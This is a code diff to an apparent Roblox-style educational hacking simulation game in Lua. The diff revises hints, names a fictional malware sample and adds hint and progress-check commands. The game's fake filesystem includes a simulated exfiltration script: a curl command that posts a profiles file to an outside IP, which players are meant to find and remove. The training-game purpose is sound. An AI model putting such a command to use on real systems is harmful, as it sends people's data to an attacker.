@@ -184,7 +184,7 @@ localhost = {
 ["notes.txt"] = "Training flow:\n1) scan nearby networks\n2) inspect packets\n3) connect safely\n4) investigate logs",
 ["capture.pcap"] = "PCAP SUMMARY (SIM)\n- weak WiFi observed\n- admin credential-like packet seen\n- outbound beacon flagged",
 ["player.txt"] = "Local profile (SIM)\nuser=rbxplayer\nrole=junior analyst",
-["chapter1.txt"] = "Hint:\nTry scan nearby\nThen sniff 192.168.32.12\nThen packets",
+["chapter1.txt"] = "Hint:\nStart with nearby recon\nFollow workstation traffic\nThen inspect packets",
 ["mail.txt"] = "Inbox preview (SIM)\nOne suspicious message references 'urgent account verification'",
 ["system.log"] = "[00:10] boot ok\n[00:11] terminal ready\n[00:12] browser renderer online",
 ["network.log"] = "[net] Bloxplay_ITWifi seen\n[net] Bloxplay_AdminWifi seen\n[net] PlayerData_Vault referenced in captured traffic",
@@ -198,7 +198,7 @@ localhost = {
 "2026-03-24 08:12:40 sshd[1941]: Failed login for backup from 203.44.18.77",
 }, "\n"),
 ["report.txt"] = "Server report (SIM)\n- outbound traffic spike detected\n- investigate running processes\n- review netstat output",
-["sync_jobs.sh"] = "#!/bin/sh\n# simulated exfil script\ncurl -X POST http://203.44.18.77/upload --data-binary @/srv/profiles.csv",
+["sync_jobs.sh"] = "#!/bin/sh\n# WannaWail (fictional) exfil loader\ncurl -X POST http://203.44.18.77/upload --data-binary @/srv/profiles.csv",
 ["admin.txt"] = "admin home note (SIM)\nPassword changed recently after incident drills.",
 ["ops.txt"] = "ops note (SIM)\nIf traffic spikes, inspect psrep and netstat first.",
 ["passwd"] = "root:x:0:0\nbloxplay-admin:x:1001:1001\nbackup:x:1002:1002",
@@ -915,7 +915,7 @@ table.concat(info.ports, ", "),
 info.role
 ))
 end
-addLine("Hint: try inspect 192.168.32.12 or 192.168.43.20 (sim)")
+addLine("Hint: inspect the employee workstation or a sensitive internal host next (sim)")
 terminalState.scanCache = "192.168.32.12"
 return
 end
@@ -1031,7 +1031,7 @@ for _, p in ipairs(getProcesses()) do
 addLine(("%-5d %-19s %s"):format(p.pid, p.name, p.status))
 end
 if terminalState.currentHost == "PlayerData_Vault" then
-addLine("Finding: PID 1337 looks suspicious (sim)")
+addLine("Finding: PID 1337 looks like WannaWail activity (fictional sim)")
 end
 end
 local function fakeKill(pidText)
@@ -1096,7 +1096,7 @@ end
 local function fakeMalwareScan()
 addLine(("Malware scanner on %s (sim)"):format(terminalState.currentHost))
 if terminalState.currentHost == "PlayerData_Vault" then
-addLine("Alert: sync_jobs.sh flagged as suspicious exfiltration utility")
+addLine("Alert: sync_jobs.sh flagged as WannaWail (fictional ransomware-style sample)")
 addLine("IOC: outbound endpoint 203.44.18.77")
 addLine("Recommended actions: kill 1337, rm sync_jobs.sh, passwd <new>")
 else
@@ -1181,6 +1181,7 @@ end
 local function showHelp()
 addLine("HackOS SIM commands:")
 addLine("help - show this list")
+addLine("hint - show a clue for the current objective")
 addLine("apps - list apps")
 addLine("open <terminal|browser|notes> - switch screens")
 addLine("visit <url|home|tips|apps> - open a page (sim)")
@@ -1239,6 +1240,43 @@ if UrlBox then UrlBox.Text = "" end
 if BrowserFrame and BrowserFrame.Visible then navigateTo("about:blank") end
 Player:SetAttribute("Obj_Admin", false)
 end
+local function getScenarioRemote(name)
+local remotes = ReplicatedStorage:FindFirstChild("Remotes")
+if not remotes then
+return nil
+end
+return remotes:FindFirstChild(name)
+end
+local function syncScenarioProgress(raw)
+local checkSolutionRemote = getScenarioRemote("CheckSolution")
+if not checkSolutionRemote then
+return
+end
+local ok, result = pcall(function()
+return checkSolutionRemote:InvokeServer(raw)
+end)
+if not ok or type(result) ~= "table" then
+return
+end
+if result.success and (result.stepComplete or result.chapterComplete) and type(result.feedback) == "string" and result.feedback ~= "" then
+addLine(result.feedback)
+end
+end
+local function showScenarioHint()
+local getHintRemote = getScenarioRemote("GetHint")
+if not getHintRemote then
+addLine("No hint available right now.")
+return
+end
+local ok, hintText = pcall(function()
+return getHintRemote:InvokeServer()
+end)
+if ok and type(hintText) == "string" and hintText ~= "" then
+addLine(hintText)
+else
+addLine("No hint available right now.")
+end
+end
 local function handle(cmdLine)
 local raw = tostring(cmdLine or ""):gsub("^%s+", ""):gsub("%s+$", "")
 addLine(PROMPT .. raw)
@@ -1266,6 +1304,8 @@ return a, b
 end
 if cmd == "help" then
 showHelp()
+elseif cmd == "hint" then
+showScenarioHint()
 elseif cmd == "apps" then
 addLine("Apps (SIM): terminal, browser, notes (soon), RBXPacketNet, admin portal")
 addLine("Tip: open browser")
@@ -1366,6 +1406,9 @@ addLine(PROMPT)
 return
 else
 addLine("I do not know that command. Type: help")
+end
+if cmd ~= "hint" then
+syncScenarioProgress(raw)
 end
 addLine(PROMPT)
 end
